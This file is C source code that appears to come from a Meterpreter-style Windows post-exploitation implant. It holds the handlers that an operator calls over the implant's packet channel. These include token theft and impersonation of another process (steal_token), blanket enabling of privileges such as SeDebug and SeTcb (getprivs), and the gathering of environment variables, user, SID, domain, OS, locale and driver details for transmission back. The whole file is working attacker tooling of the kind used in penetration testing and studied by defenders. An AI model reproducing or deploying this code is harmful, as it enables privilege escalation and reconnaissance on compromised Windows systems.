#include "precomp.h"
#include "common_metapi.h"

#include <sddl.h>
#include <lm.h>
#include <psapi.h>

typedef NTSTATUS(WINAPI *PRtlGetVersion)(LPOSVERSIONINFOEXW);

/*!
 * @brief Add an environment variable / value pair to a response packet.
 * @param response The \c Response packet to add the values to.
 * @param envVar The name of the environment variable to add.
 * @param envVal The value of the environment.
 */
VOID add_env_pair(Packet *response, char * envVar, char *envVal)
{
	Tlv entries[2] = { 0 };

	if (envVal)
	{
		entries[0].header.type = TLV_TYPE_ENV_VARIABLE;
		entries[0].header.length = (DWORD)strlen(envVar) + 1;
		entries[0].buffer = (PUCHAR)envVar;

		entries[1].header.type = TLV_TYPE_ENV_VALUE;
		entries[1].header.length = (DWORD)strlen(envVal) + 1;
		entries[1].buffer = (PUCHAR)envVal;

		met_api->packet.add_tlv_group(response, TLV_TYPE_ENV_GROUP, entries, 2);
	}
	else
	{
		dprintf("[ENV] No value found for %s", envVar);
	}
}

/*!
 * @brief Expand a given set of environment variables.
 * @param remote Pointer to the \c Remote instance making the request.
 * @param packet Pointer to the \c Request packet.
 * @remarks This will return a hash of the list of environment variables
 *          and their values, as requested by the caller.
 * @returns Indication of success or failure.
 */
DWORD request_sys_config_getenv(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD dwResult = ERROR_SUCCESS;
	DWORD dwTlvIndex = 0;
	Tlv envTlv;
	char* pEnvVarStart;
	char* pEnvVarEnd;

	do
	{
		while (ERROR_SUCCESS == met_api->packet.enum_tlv(packet, dwTlvIndex++, TLV_TYPE_ENV_VARIABLE, &envTlv))
		{
			pEnvVarStart = (char*)envTlv.buffer;

			dprintf("[ENV] Processing: %s", pEnvVarStart);

			// skip any '%' or '$' if they were specified.
			while (*pEnvVarStart != '\0' && (*pEnvVarStart == '$' || *pEnvVarStart == '%'))
			{
				++pEnvVarStart;
			}

			dprintf("[ENV] pEnvStart: %s", pEnvVarStart);

			pEnvVarEnd = pEnvVarStart;

			// if we're on windows, the caller might have passed in '%' at the end, so remove that
			// if it's there.
			while (*pEnvVarEnd != '\0')
			{
				if (*pEnvVarEnd == '%')
				{
					// terminate it here instead
					*pEnvVarEnd = '\0';
					break;
				}
				++pEnvVarEnd;
			}

			dprintf("[ENV] Final env var: %s", pEnvVarStart);

			// grab the value of the variable and stick it in the response.
			PWCHAR name = met_api->string.utf8_to_wchar(pEnvVarStart);
			//Ensure we always have > 0 bytes even if env var doesn't exist
			DWORD envlen = GetEnvironmentVariableW(name, NULL, 0) + 1;
			PWCHAR wvalue = (PWCHAR)malloc(envlen * sizeof(WCHAR));
			GetEnvironmentVariableW(name, wvalue, envlen);
			free(name);
			char* value = met_api->string.wchar_to_utf8(wvalue);
			free(wvalue);
			add_env_pair(response, pEnvVarStart, value);
			free(value);

			dprintf("[ENV] Env var added");
		}
	} while (0);

	dprintf("[ENV] Transmitting response.");
	met_api->packet.transmit_response(dwResult, remote, response);

	dprintf("[ENV] done.");
	return dwResult;
}

/*
 * @brief Get the token information for the current thread/process.
 * @param pTokenUser Buffer to receive the token data.
 * @param dwBufferSize Size of the buffer that will receive the token data.
 * @returns Indication of success or failure.
 */
DWORD get_user_token(LPVOID pTokenUser, DWORD dwBufferSize)
{
	DWORD dwResult = 0;
	DWORD dwReturnedLength = 0;
	HANDLE hToken;

	do
	{
		if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken))
		{
			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
			{
				BREAK_ON_ERROR("[TOKEN] Failed to get a valid token for thread/process.");
			}
		}

		if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwReturnedLength))
		{
			BREAK_ON_ERROR("[TOKEN] Failed to get token information for thread/process.");
		}

		dwResult = ERROR_SUCCESS;
	} while (0);

	return dwResult;
}

/*
 * @brief Get the SID of the current process/thread.
 * @param pRemote Pointer to the \c Remote instance.
 * @param pRequest Pointer to the \c Request packet.
 * @returns Indication of success or failure.
 */
DWORD request_sys_config_getsid(Remote* pRemote, Packet* pRequest)
{
	DWORD dwResult;
	BYTE tokenUserInfo[4096];
	LPSTR pSid = NULL;
	Packet *pResponse = met_api->packet.create_response(pRequest);

	do
	{
		dwResult = get_user_token(tokenUserInfo, sizeof(tokenUserInfo));
		if (dwResult != ERROR_SUCCESS)
		{
			break;
		}

		if (!ConvertSidToStringSidA(((TOKEN_USER*)tokenUserInfo)->User.Sid, &pSid))
		{
			BREAK_ON_ERROR("[GETSID] Unable to convert current SID to string");
		}

	} while (0);

	if (pSid != NULL)
	{
		met_api->packet.add_tlv_string(pResponse, TLV_TYPE_SID, pSid);
		LocalFree(pSid);
	}

	met_api->packet.transmit_response(dwResult, pRemote, pResponse);

	return dwResult;
}

/*
 * @brief Get the UID of the current process/thread.
 * @param pRequest Pointer to the \c Request packet.
 * @returns Indication of success or failure.
 * @remark This is a helper function that does the grunt work
 *         for getting the user details which is used in a few
 *         other locations.
 */
DWORD populate_uid(Packet* pResponse)
{
	DWORD dwResult;
	WCHAR cbUserOnly[512], cbDomainOnly[512];
	CHAR cbUsername[1024];
	BYTE tokenUserInfo[4096];
	DWORD dwUserSize = sizeof(cbUserOnly), dwDomainSize = sizeof(cbDomainOnly);
	DWORD dwSidType = 0;

	memset(cbUsername, 0, sizeof(cbUsername));
	memset(cbUserOnly, 0, sizeof(cbUserOnly));
	memset(cbDomainOnly, 0, sizeof(cbDomainOnly));

	do
	{
		if ((dwResult = get_user_token(tokenUserInfo, sizeof(tokenUserInfo))) != ERROR_SUCCESS)
		{
			dprintf("[POPUID] unable to get user token");
			break;
		}

		if (!LookupAccountSidW(NULL, ((TOKEN_USER*)tokenUserInfo)->User.Sid, cbUserOnly, &dwUserSize, cbDomainOnly, &dwDomainSize, (PSID_NAME_USE)&dwSidType))
		{
			BREAK_ON_ERROR("[GETUID] Failed to lookup the account SID data");
		}

		char *domainName = met_api->string.wchar_to_utf8(cbDomainOnly);
		char *userName = met_api->string.wchar_to_utf8(cbUserOnly);
 		// Make full name in DOMAIN\USERNAME format
		_snprintf(cbUsername, 512, "%s\\%s", domainName, userName);
		free(domainName);
		free(userName);
		cbUsername[511] = '\0';

		met_api->packet.add_tlv_string(pResponse, TLV_TYPE_USER_NAME, cbUsername);

		dwResult = EXIT_SUCCESS;
	} while (0);

	return dwResult;
}

/*
 * @brief Get the user name of the current process/thread.
 * @param pRemote Pointer to the \c Remote instance.
 * @param pRequest Pointer to the \c Request packet.
 * @returns Indication of success or failure.
 */
DWORD request_sys_config_getuid(Remote* pRemote, Packet* pPacket)
{
	Packet *pResponse = met_api->packet.create_response(pPacket);
	DWORD dwResult = ERROR_SUCCESS;

	dwResult = populate_uid(pResponse);

	// Transmit the response
	met_api->packet.transmit_response(dwResult, pRemote, pResponse);

	return dwResult;
}

/*
 * @brief Drops an existing thread token.
 * @param pRemote Pointer to the \c Remote instance.
 * @param pRequest Pointer to the \c Request packet.
 * @returns Indication of success or failure.
 */
DWORD request_sys_config_drop_token(Remote* pRemote, Packet* pPacket)
{
	Packet* pResponse = met_api->packet.create_response(pPacket);
	DWORD dwResult = ERROR_SUCCESS;

	met_api->thread.update_token(pRemote, NULL);
	dwResult = populate_uid(pResponse);

	// Transmit the response
	met_api->packet.transmit_response(dwResult, pRemote, pResponse);

	return dwResult;
}

/*
 * sys_getprivs
 * ----------
 *
 * Obtains as many privileges as possible
 * Based on the example at http://nibuthomas.com/tag/openprocesstoken/
 */
DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD res = ERROR_SUCCESS;
	HANDLE token = NULL;
	int x;
	TOKEN_PRIVILEGES priv = { 0 };
	LPCTSTR privs[] = {
		SE_ASSIGNPRIMARYTOKEN_NAME,
		SE_AUDIT_NAME,
		SE_BACKUP_NAME,
		SE_CHANGE_NOTIFY_NAME,
		SE_CREATE_GLOBAL_NAME,
		SE_CREATE_PAGEFILE_NAME,
		SE_CREATE_PERMANENT_NAME,
		SE_CREATE_SYMBOLIC_LINK_NAME,
		SE_CREATE_TOKEN_NAME,
		SE_DEBUG_NAME,
		SE_ENABLE_DELEGATION_NAME,
		SE_IMPERSONATE_NAME,
		SE_INC_BASE_PRIORITY_NAME,
		SE_INCREASE_QUOTA_NAME,
		SE_INC_WORKING_SET_NAME,
		SE_LOAD_DRIVER_NAME,
		SE_LOCK_MEMORY_NAME,
		SE_MACHINE_ACCOUNT_NAME,
		SE_MANAGE_VOLUME_NAME,
		SE_PROF_SINGLE_PROCESS_NAME,
		SE_RELABEL_NAME,
		SE_REMOTE_SHUTDOWN_NAME,
		SE_RESTORE_NAME,
		SE_SECURITY_NAME,
		SE_SHUTDOWN_NAME,
		SE_SYNC_AGENT_NAME,
		SE_SYSTEM_ENVIRONMENT_NAME,
		SE_SYSTEM_PROFILE_NAME,
		SE_SYSTEMTIME_NAME,
		SE_TAKE_OWNERSHIP_NAME,
		SE_TCB_NAME,
		SE_TIME_ZONE_NAME,
		SE_TRUSTED_CREDMAN_ACCESS_NAME,
		SE_UNDOCK_NAME,
		SE_UNSOLICITED_INPUT_NAME,
		NULL
	};

	do
	{
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
		{
			res = GetLastError();
			dprintf("[GETPRIVS] Failed to open the process token: %u 0x%x", res, res);
			break;
		}

		for (x = 0; privs[x]; ++x)
		{
			memset(&priv, 0, sizeof(priv));
			LookupPrivilegeValue(NULL, privs[x], &priv.Privileges[0].Luid);
			priv.PrivilegeCount = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (AdjustTokenPrivileges(token, FALSE, &priv, 0, 0, 0))
			{
				if (GetLastError() == ERROR_SUCCESS)
				{
					dprintf("[GETPRIVS] Got Priv %s", privs[x]);
					met_api->packet.add_tlv_string(response, TLV_TYPE_PRIVILEGE, privs[x]);
				}
			}
			else
			{
				dprintf("[GETPRIVS] Failed to set privilege %s (%u)", privs[x], GetLastError());
			}
		}
	} while (0);

	if (token)
	{
		CloseHandle(token);
	}

	// Transmit the response
	met_api->packet.transmit_response(res, remote, response);

	return res;
}

/*
 * sys_steal_token
 * ----------
 *
 * Steals the primary token from an existing process
 */
DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD dwResult = ERROR_SUCCESS;
	HANDLE hToken = NULL;
	HANDLE hProcessHandle = NULL;
	HANDLE hDupToken = NULL;
	DWORD dwPid;

	do
	{
		// Get the process identifier that we're attaching to, if any.
		dwPid = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_PID);

		if (!dwPid)
		{
			dprintf("[STEAL-TOKEN] invalid pid");
			dwResult = -1;
			break;
		}

		hProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);

		if (!hProcessHandle)
		{
			dwResult = GetLastError();
			dprintf("[STEAL-TOKEN] Failed to open process handle for %d (%u)", dwPid, dwResult);
			break;
		}

		if (!OpenProcessToken(hProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken))
		{
			dwResult = GetLastError();
			dprintf("[STEAL-TOKEN] Failed to open process token for %d (%u)", dwPid, dwResult);
			break;
		}

		if (!ImpersonateLoggedOnUser(hToken))
		{
			dwResult = GetLastError();
			dprintf("[STEAL-TOKEN] Failed to impersonate token for %d (%u)", dwPid, dwResult);
			break;
		}

		if (!DuplicateTokenEx(hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityIdentification, TokenPrimary, &hDupToken))
		{
			dwResult = GetLastError();
			dprintf("[STEAL-TOKEN] Failed to duplicate a primary token for %d (%u)", dwPid, dwResult);
			break;
		}

		dprintf("[STEAL-TOKEN] so far so good, updating thread token");
		met_api->thread.update_token(remote, hDupToken);

		dprintf("[STEAL-TOKEN] populating UID");
		dwResult = populate_uid(response);
	} while (0);

	if (hProcessHandle)
	{
		CloseHandle(hProcessHandle);
	}

	if (hToken)
	{
		CloseHandle(hToken);
	}
	// Transmit the response
	met_api->packet.transmit_response(dwResult, remote, response);

	return dwResult;
}

DWORD add_windows_os_version(Packet** packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	CHAR buffer[512] = { 0 };

	do
	{
		HMODULE hNtdll = GetModuleHandleA("ntdll");
		if (hNtdll == NULL)
		{
			BREAK_ON_ERROR("[SYSINFO] Failed to load ntoskrnl");
		}

		PRtlGetVersion pRtlGetVersion = (PRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
		if (pRtlGetVersion == NULL)
		{
			BREAK_ON_ERROR("[SYSINFO] Couldn't find RtlGetVersion in ntoskrnl");
		}

		OSVERSIONINFOEXW v = { 0 };
		v.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

		if (0 != pRtlGetVersion(&v))
		{
			dwResult = ERROR_INVALID_DLL;
			dprintf("[SYSINFO] Unable to get OS version with RtlGetVersion");
			break;
		}

		dprintf("[VERSION] Major   : %u", v.dwMajorVersion);
		dprintf("[VERSION] Minor   : %u", v.dwMinorVersion);
		dprintf("[VERSION] Build   : %u", v.dwBuildNumber);
		dprintf("[VERSION] Maint   : %S", v.szCSDVersion);
		dprintf("[VERSION] Platform: %u", v.dwPlatformId);
		dprintf("[VERSION] Type    : %hu", v.wProductType);
		dprintf("[VERSION] SP Major: %hu", v.wServicePackMajor);
		dprintf("[VERSION] SP Minor: %hu", v.wServicePackMinor);
		dprintf("[VERSION] Suite   : %hu", v.wSuiteMask);

		CHAR* osName = NULL;

		if (v.dwMajorVersion == 3)
		{
			osName = "Windows NT 3.51";
		}
		else if (v.dwMajorVersion == 4)
		{
			if (v.dwMinorVersion == 0 && v.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
			{
				osName = "Windows 95";
			}
			else if (v.dwMinorVersion == 10)
			{
				osName = "Windows 98";
			}
			else if (v.dwMinorVersion == 90)
			{
				osName = "Windows ME";
			}
			else if (v.dwMinorVersion == 0 && v.dwPlatformId == VER_PLATFORM_WIN32_NT)
			{
				osName = "Windows NT 4.0";
			}
		}
		else if (v.dwMajorVersion == 5)
		{
			if (v.dwMinorVersion == 0)
			{
				osName = "Windows 2000";
			}
			else if (v.dwMinorVersion == 1)
			{
				osName = "Windows XP";
			}
			else if (v.dwMinorVersion == 2)
			{
				osName = "Windows .NET Server";
			}
		}
		else if (v.dwMajorVersion == 6)
		{
			if (v.dwMinorVersion == 0)
			{
				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows Vista" : "Windows 2008";
			}
			else if (v.dwMinorVersion == 1)
			{
				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 7" : "Windows 2008 R2";
			}
			else if (v.dwMinorVersion == 2)
			{
				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 8" : "Windows 2012";
			}
			else if (v.dwMinorVersion == 3)
			{
				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 8.1" : "Windows 2012 R2";
			}
		}
		else if (v.dwMajorVersion == 10)
		{
			if (v.dwMinorVersion == 0)
			{
				osName = v.wProductType == VER_NT_WORKSTATION ? "Windows 10" : "Windows 2016+";
			}
		}

		if (!osName)
		{
			osName = "Unknown";
		}

		if (wcslen(v.szCSDVersion) > 0)
		{
			_snprintf(buffer, sizeof(buffer)-1, "%s (%u.%u Build %u, %S).", osName, v.dwMajorVersion, v.dwMinorVersion, v.dwBuildNumber, v.szCSDVersion);
		}
		else
		{
			_snprintf(buffer, sizeof(buffer)-1, "%s (%u.%u Build %u).", osName, v.dwMajorVersion, v.dwMinorVersion, v.dwBuildNumber);
		}

		dprintf("[VERSION] Version set to: %s", buffer);
		met_api->packet.add_tlv_string(*packet, TLV_TYPE_OS_NAME, buffer);
	} while (0);

	return dwResult;
}

/*
 * @brief Handle the request to get local date/time information.
 * @param remote Pointer to the remote instance.
 * @param packet Pointer to the request packet.
 * @return Indication of success or failure.
 */
DWORD request_sys_config_localtime(Remote* remote, Packet* packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;
	char dateTime[128] = { 0 };

	TIME_ZONE_INFORMATION tzi = { 0 };
	SYSTEMTIME localTime = { 0 };

	DWORD tziResult = GetTimeZoneInformation(&tzi);
	GetLocalTime(&localTime);

	_snprintf_s(dateTime, sizeof(dateTime), sizeof(dateTime) - 1, "%d-%02d-%02d %02d:%02d:%02d.%d %S (UTC%s%d)",
		localTime.wYear, localTime.wMonth, localTime.wDay,
		localTime.wHour, localTime.wMinute, localTime.wSecond, localTime.wMilliseconds,
		tziResult == TIME_ZONE_ID_DAYLIGHT ? tzi.DaylightName : tzi.StandardName,
		tzi.Bias > 0 ? "-" : "+", abs(tzi.Bias / 60 * 100));

	dprintf("[SYSINFO] Local Date/Time: %s", dateTime);
	met_api->packet.add_tlv_string(response, TLV_TYPE_LOCAL_DATETIME, dateTime);

	// Transmit the response
	met_api->packet.transmit_response(result, remote, response);

	return result;
}

/*
 * sys_sysinfo
 * ----------
 *
 * Get system information such as computer name and OS version
 */
DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	CHAR computer[512], buf[512], * osArch = NULL;
	DWORD res = ERROR_SUCCESS;
	DWORD size = sizeof(computer);
	HMODULE hKernel32;

	memset(computer, 0, sizeof(computer));
	memset(buf, 0, sizeof(buf));

	do
	{
		// Get the computer name
		if (!GetComputerName(computer, &size))
		{
			res = GetLastError();
			break;
		}

		met_api->packet.add_tlv_string(response, TLV_TYPE_COMPUTER_NAME, computer);
		add_windows_os_version(&response);

		// sf: we dynamically retrieve GetNativeSystemInfo & IsWow64Process as NT and 2000 dont support it.
		hKernel32 = LoadLibraryA("kernel32.dll");
		if (hKernel32)
		{
			typedef void (WINAPI * GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
			typedef BOOL(WINAPI * ISWOW64PROCESS)(HANDLE, PBOOL);
			GETNATIVESYSTEMINFO pGetNativeSystemInfo = (GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
			ISWOW64PROCESS pIsWow64Process = (ISWOW64PROCESS)GetProcAddress(hKernel32, "IsWow64Process");
			if (pGetNativeSystemInfo)
			{
				SYSTEM_INFO SystemInfo;
				pGetNativeSystemInfo(&SystemInfo);
				switch (SystemInfo.wProcessorArchitecture)
				{
				case PROCESSOR_ARCHITECTURE_AMD64:
					osArch = "x64";
					break;
				case PROCESSOR_ARCHITECTURE_IA64:
					osArch = "IA64";
					break;
				case PROCESSOR_ARCHITECTURE_INTEL:
					osArch = "x86";
					break;
				default:
					break;
				}
			}
		}
		// if we havnt set the arch it is probably because we are on NT/2000 which is x86
		if (!osArch)
		{
			osArch = "x86";
		}

		dprintf("[SYSINFO] Arch set to: %s", osArch);
		met_api->packet.add_tlv_string(response, TLV_TYPE_ARCHITECTURE, osArch);

		if (hKernel32)
		{
			char * ctryname = NULL, *langname = NULL;
			typedef LANGID(WINAPI * GETSYSTEMDEFAULTLANGID)(VOID);
			GETSYSTEMDEFAULTLANGID pGetSystemDefaultLangID = (GETSYSTEMDEFAULTLANGID)GetProcAddress(hKernel32, "GetSystemDefaultLangID");
			if (pGetSystemDefaultLangID)
			{
				LANGID langId = pGetSystemDefaultLangID();

				int len = GetLocaleInfo(langId, LOCALE_SISO3166CTRYNAME, 0, 0);
				if (len > 0)
				{
					ctryname = (char *)malloc(len);
					GetLocaleInfo(langId, LOCALE_SISO3166CTRYNAME, ctryname, len);
				}

				len = GetLocaleInfo(langId, LOCALE_SISO639LANGNAME, 0, 0);
				if (len > 0)
				{
					langname = (char *)malloc(len);
					GetLocaleInfo(langId, LOCALE_SISO639LANGNAME, langname, len);
				}
			}

			if (!ctryname || !langname)
			{
				_snprintf(buf, sizeof(buf)-1, "Unknown");
			}
			else
			{
				_snprintf(buf, sizeof(buf)-1, "%s_%s", langname, ctryname);
			}

			met_api->packet.add_tlv_string(response, TLV_TYPE_LANG_SYSTEM, buf);

			if (ctryname)
			{
				free(ctryname);
			}

			if (langname)
			{
				free(langname);
			}
		}

		LPWKSTA_INFO_102 localSysinfo = NULL;

		if (NetWkstaGetInfo(NULL, 102, (LPBYTE *)&localSysinfo) == NERR_Success)
		{
			char *domainName = met_api->string.wchar_to_utf8(localSysinfo->wki102_langroup);
			met_api->packet.add_tlv_string(response, TLV_TYPE_DOMAIN, (LPCSTR)domainName);
			met_api->packet.add_tlv_uint(response, TLV_TYPE_LOGGED_ON_USER_COUNT, localSysinfo->wki102_logged_on_users);
			free(domainName);
		}
		else
		{
			dprintf("[CONFIG] Failed to get local system info for logged on user count / domain");
		}
	} while (0);

	// Transmit the response
	met_api->packet.transmit_response(res, remote, response);

	return res;
}


/*
 * sys_config_rev2self
 *
 * Calls RevertToSelf()
 */
DWORD request_sys_config_rev2self(Remote *remote, Packet *packet)
{
	DWORD dwResult    = ERROR_SUCCESS;
	Packet * response = NULL;

	do
	{
		response = met_api->packet.create_response(packet);
		if (!response)
		{
			dwResult = ERROR_INVALID_HANDLE;
			break;
		}

		met_api->thread.update_token(remote, NULL);

		met_api->desktop.update(remote, -1, NULL, NULL);

		if (!RevertToSelf())
			dwResult = GetLastError();

	} while(0);

	if (response)
		met_api->packet.transmit_response(dwResult, remote, response);

	return dwResult;
}

/*!
 * @brief Handle the driver list function call.
 */
DWORD request_sys_config_driver_list(Remote *remote, Packet *packet)
{
	Packet* response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;

	LPVOID ignored = NULL;
	DWORD sizeNeeded = 0;

	// start by getting the size required to store the driver list
	EnumDeviceDrivers(&ignored, sizeof(ignored), &sizeNeeded);

	if (sizeNeeded > 0)
	{
		dprintf("[CONFIG] Size required for driver list: %u 0x%x", sizeNeeded, sizeNeeded);

		LPVOID* driverList = (LPVOID*)malloc(sizeNeeded);
		if (driverList)
		{
			if (EnumDeviceDrivers(driverList, sizeNeeded, &sizeNeeded))
			{
				wchar_t baseName[MAX_PATH];
				wchar_t fileName[MAX_PATH];
				DWORD driverCount = sizeNeeded / sizeof(LPVOID);
				dprintf("[CONFIG] Total driver handles: %u", driverCount);

				for (DWORD i = 0; i < driverCount; ++i)
				{
					BOOL valid = TRUE;

					if (!GetDeviceDriverBaseNameW(driverList[i], baseName, MAX_PATH))
					{
						dprintf("[CONFIG] %d Driver base name read failed: %u 0x%x", i, GetLastError(), GetLastError());
						// null terminate the string at the start, indicating that it's invalid
						baseName[0] = L'\x00';
					}
					else
					{
						dprintf("[CONFIG] %d Driver basename: %S", i, baseName);
					}

					if (!GetDeviceDriverFileNameW(driverList[i], fileName, MAX_PATH))
					{
						dprintf("[CONFIG] %d Driver file name read failed: %u 0x%x", i, GetLastError(), GetLastError());

						// null terminate the string at the start, indicating that it's invalid
						fileName[0] = L'\x00';

						// we'll mark the entry as invalid if both calls failed.
						valid = baseName[0] != L'\x00';
					}
					else
					{
						dprintf("[CONFIG] %d Driver filename: %S", i, fileName);
					}

					if (valid)
					{
						Packet* entry = met_api->packet.create_group();

						char* bn = met_api->string.wchar_to_utf8(baseName);
						met_api->packet.add_tlv_string(entry, TLV_TYPE_DRIVER_BASENAME, bn);
						free(bn);

						char* fn = met_api->string.wchar_to_utf8(fileName);
						met_api->packet.add_tlv_string(entry, TLV_TYPE_DRIVER_FILENAME, fn);
						free(fn);

						met_api->packet.add_group(response, TLV_TYPE_DRIVER_ENTRY, entry);
					}
				}
			}

			free(driverList);
		}
		else
		{
			result = ERROR_OUTOFMEMORY;
		}
	}

	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}
